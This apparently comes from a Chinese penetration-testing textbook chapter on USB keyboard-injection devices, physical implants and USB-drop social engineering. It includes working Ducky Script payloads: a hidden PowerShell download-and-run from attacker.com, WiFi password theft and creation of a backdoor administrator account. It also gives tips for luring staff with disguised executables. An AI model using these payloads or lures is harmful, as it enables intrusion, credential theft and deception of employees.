# USB攻击与物理植入

### 6.1 Rubber Ducky原理与使用

Rubber Ducky是Hak5公司推出的一款著名的USB键盘注入工具，外形看起来像一个普通的U盘，但插入电脑后会被识别为USB键盘，然后自动执行预先编写的键盘输入脚本。

#### 6.1.1 键盘注入攻击原理

**USB HID协议：**

USB人体接口设备（Human Interface Device, HID）协议是USB设备与计算机通信的标准协议之一，键盘、鼠标等输入设备都使用这个协议。

**攻击原理：**

1. 攻击者将恶意设备插入目标电脑的USB接口
2. 电脑将该设备识别为标准USB键盘
3. 设备自动发送预编程的键盘输入序列
4. 这些输入会被系统当作真实用户的操作来执行
5. 通过组合键、命令行等方式执行恶意操作

**为什么有效：**

- 操作系统默认信任USB键盘设备
- 不需要安装任何驱动程序
- 防病毒软件通常不会监控键盘输入
- 攻击速度非常快，几秒钟内即可完成

#### 6.1.2 Ducky Script编写

Ducky Script是Rubber Ducky使用的脚本语言，语法简单直观。

**基本语法：**

```
DELAY 1000        # 延迟1000毫秒（1秒）
STRING hello      # 输入字符串"hello"
ENTER             # 按下回车键
GUI r             # 按下Windows键+R（打开运行对话框）
CTRL ALT DELETE   # 按下Ctrl+Alt+Del
```

**常用命令：**

| 命令 | 说明 |
|------|------|
| `DELAY` | 延迟指定毫秒数 |
| `STRING` | 输入字符串 |
| `ENTER` | 回车键 |
| `TAB` | Tab键 |
| `GUI` | Windows键/Command键 |
| `SHIFT` | Shift键 |
| `ALT` | Alt键 |
| `CTRL` | Control键 |
| `SPACE` | 空格键 |
| `BACKSPACE` | 退格键 |
| `DOWN/UP/LEFT/RIGHT` | 方向键 |
| `REPEAT` | 重复上一条命令 |

#### 6.1.3 实战Payload示例

**示例1：打开命令行并执行命令**

```
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING whoami
ENTER
```

**示例2：下载并执行恶意程序**

```
DELAY 500
GUI r
DELAY 300
STRING powershell -windowstyle hidden -command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
```

**示例3：窃取WiFi密码**

```
DELAY 1000
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 500
STRING netsh wlan show profiles name=* key=clear > %temp%\wifi.txt & explorer %temp%
ENTER
```

**示例4：创建后门用户**

```
DELAY 500
GUI r
DELAY 300
STRING cmd
CTRL SHIFT ENTER
DELAY 2000
LEFT
ENTER
DELAY 1000
STRING net user backdoor Password123 /add & net localgroup administrators backdoor /add
ENTER
```

### 6.2 Bash Bunny使用

Bash Bunny是Hak5推出的另一款高级USB攻击设备，比Rubber Ducky功能更强大。它本质上是一台运行Linux的小型计算机，可以模拟多种USB设备。

**主要功能：**

- 模拟USB键盘（HID攻击）
- 模拟USB网卡（中间人攻击）
- 模拟USB串口
- 模拟USB存储设备
- 多种攻击模式组合
- 支持Payload切换
- 支持窃取数据和凭据

**攻击场景：**

- 快速获取Shell访问
- 窃取NTLM哈希
- 网络流量劫持
- DNS欺骗
- 钓鱼攻击

### 6.3 BadUSB原理

BadUSB是一类利用USB设备固件漏洞的攻击技术。普通的USB设备（如U盘、USB集线器等）的固件可以被篡改，使设备在保持原有功能的同时，具备额外的攻击能力。

**攻击原理：**

1. 攻击者获取一个普通USB设备
2. 刷入修改后的恶意固件
3. 设备插入电脑后，除了原有的功能（如存储），还会模拟键盘、网卡等设备
4. 利用模拟的设备执行攻击操作

**BadUSB与Rubber Ducky的区别：**

- Rubber Ducky是专门设计的攻击工具
- BadUSB是将普通USB设备改造成攻击工具
- BadUSB更具隐蔽性，因为设备外观和部分功能正常
- BadUSB可以同时具备多种功能（如存储+键盘）

**常见的BadUSB目标设备：**

- U盘/移动硬盘
- USB集线器
- USB网卡
- USB充电器
- USB台灯等小玩意

### 6.4 O.MG Cable等高级植入设备

#### 6.4.1 O.MG Cable

O.MG Cable是一款看起来完全正常的USB数据线，但内置了恶意功能。

**功能特点：**

- 外观与普通数据线完全一样
- 支持HID键盘注入
- 支持WiFi远程控制
- 可以通过无线方式触发Payload
- 支持数据窃取
- 可以长时间植入，难以发现

**攻击场景：**

- 将恶意数据线替换目标场所的正常数据线
- 伪装成赠送的礼品数据线
- 放在公共场所等人拾取

#### 6.4.2 其他高级植入设备

**USB Ninja：**
- 隐藏在USB线缆中的攻击设备
- 支持远程控制
- 支持多种攻击模式

**USB Killer：**
- 不是数据攻击，而是物理破坏
- 通过高压脉冲损坏设备的USB接口和主板
- 用于物理破坏场景

**恶意USB充电器：**
- 外观是正常的手机充电器
- 内置恶意芯片和存储
- 插入后自动执行攻击

### 6.5 物理植入设备部署

#### 6.5.1 Dropbox部署

Dropbox（不是云存储服务，而是物理植入设备）是指部署在目标网络中的小型设备，用于提供远程访问能力。

**常见的Dropbox设备：**

- **Raspberry Pi**：树莓派，体积小，功能强大
- **Pocket CHIP**：掌上Linux电脑
- **网络间谍设备**：专门设计的小型植入设备
- **改装的路由器**：刷入OpenWrt等固件

**部署方式：**

- 接入目标网络的空闲网口
- 连接到目标的WiFi网络
- 放置在不易被发现的角落（如桌子底下、设备架上）
- 通过4G/LTE模块提供外网回连能力

**功能：**

- 提供VPN接入
- 端口转发
- 内网扫描
- 流量嗅探
- 凭据窃取

#### 6.5.2 网络Tap

网络Tap（Test Access Point）是一种用于监控网络流量的设备，可以在不影响正常通信的情况下，复制网络流量。

**部署位置：**

- 服务器和交换机之间
- 交换机和路由器之间
- 关键网络链路中间

**用途：**

- 流量嗅探和分析
- 明文密码窃取
- 会话劫持
- 数据泄露

**类型：**

- 被动Tap：不影响网络通信，仅复制流量
- 主动Tap：可以修改或注入流量
- 以太网Tap：用于有线网络
- WiFi Tap：用于无线网络

### 6.6 社会工程+USB攻击结合（丢U盘战术）

"丢U盘"战术是将社会工程学与USB攻击相结合的经典攻击方法。攻击者将带有恶意程序的U盘故意"丢失"在目标场所，引诱目标人员插入电脑。

#### 6.6.1 攻击原理

1. 攻击者准备好带有恶意程序的U盘
2. 将U盘"丢失"在目标公司的停车场、大堂、卫生间等地方
3. 员工发现U盘后，出于好奇心或职业精神，将其插入电脑查看内容
4. U盘中的恶意程序自动运行（通过自动播放或诱骗用户点击）
5. 攻击者获得对目标电脑的控制权

#### 6.6.2 提升成功率的技巧

**U盘外观：**

- 使用品牌U盘，看起来有价值
- 在U盘上贴标签，如"人事档案"、"财务报表"、"工资单"等吸引人的标签
- 使用不同颜色和容量的U盘，增加多样性

**内容设计：**

- 准备几个看似真实的文档（如Excel表格、Word文档）
- 文件名要吸引人，如"2024年薪资调整方案.xlsx"
- 恶意程序可以伪装成文档（如使用双扩展名 .xlsx.exe）
- 或者利用Office宏、快捷方式等执行恶意代码

**投放位置：**

- 停车场：人们上车前容易发现
- 卫生间：洗手台或隔间
- 电梯间：地面或长椅上
- 员工出入口附近
- 会议室门口

**心理因素：**

- 人们普遍有好奇心
- 人们可能想知道是谁丢的、里面有什么
- 有些人可能想"占便宜"得到有价值的信息
- 好人可能想找到失主，从而插入电脑查找线索

---

---

